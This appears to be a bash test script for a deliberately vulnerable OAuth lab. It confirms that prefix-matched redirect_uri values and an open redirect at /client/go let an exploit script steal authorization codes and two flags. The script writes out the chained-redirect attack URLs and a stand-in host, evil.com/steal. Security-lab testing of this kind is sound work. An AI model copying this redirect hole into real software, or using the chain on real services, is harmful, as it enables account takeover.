#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 4

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8097 2>/dev/null; do sleep 1; done

BASE="http://127.0.0.1:8097"

# Test 1: prefix check accepts chained redirect_uri
OPEN_REDIRECT=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${BASE}/client/go?to=${BASE}/attacker/land', safe=''))")
OUT=$(curl -sL "${BASE}/oauth/authorize?client_id=trusted-app&response_type=code&redirect_uri=${OPEN_REDIRECT}&state=xyz" --max-redirs 5 2>/dev/null)
check "OAuth server accepts chained redirect_uri (prefix match)" "$( echo "$OUT" | grep -q 'stolen_code' && echo 1 || echo 0 )"

# Test 2: /api/profile rejects request without token
OUT=$(curl -s "${BASE}/api/profile" 2>/dev/null)
check "api/profile rejects unauthenticated request" "$( echo "$OUT" | grep -q '"unauthorized"' && echo 1 || echo 0 )"

# Test 3: exact redirect_uri is also accepted
OUT=$(curl -si "${BASE}/oauth/authorize?client_id=trusted-app&response_type=code&redirect_uri=${BASE}/client/callback&state=abc" 2>/dev/null | head -20)
check "OAuth server accepts exact legitimate redirect_uri" "$( echo "$OUT" | grep -qi 'code=' && echo 1 || echo 0 )"

# Test 4: redirect_uri outside prefix is rejected
BAD_URI=$(python3 -c "import urllib.parse; print(urllib.parse.quote('http://evil.com/steal', safe=''))")
OUT=$(curl -s "${BASE}/oauth/authorize?client_id=trusted-app&response_type=code&redirect_uri=${BAD_URI}" 2>/dev/null)
check "OAuth server rejects redirect_uri outside prefix" "$( echo "$OUT" | grep -q '"invalid_redirect_uri"' && echo 1 || echo 0 )"

# Test 5: open redirect at /client/go forwards to any URL
DEST=$(python3 -c "import urllib.parse; print(urllib.parse.quote('http://example.com/', safe=''))")
OUT=$(curl -si "${BASE}/client/go?to=${DEST}" 2>/dev/null | head -10)
check "/client/go redirects to arbitrary destination" "$( echo "$OUT" | grep -qi 'Location:' && echo 1 || echo 0 )"

# Test 6: full exploit chain via exploit.py
EXPLOIT_OUT=$(python3 exploit/exploit.py 127.0.0.1 8097 2>&1)
FLAG1=$(echo "$EXPLOIT_OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
FLAG2=$(echo "$EXPLOIT_OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | tail -1)
check "exploit steals flag1 via open redirect chain" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
check "exploit steals flag2 via stolen auth code" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
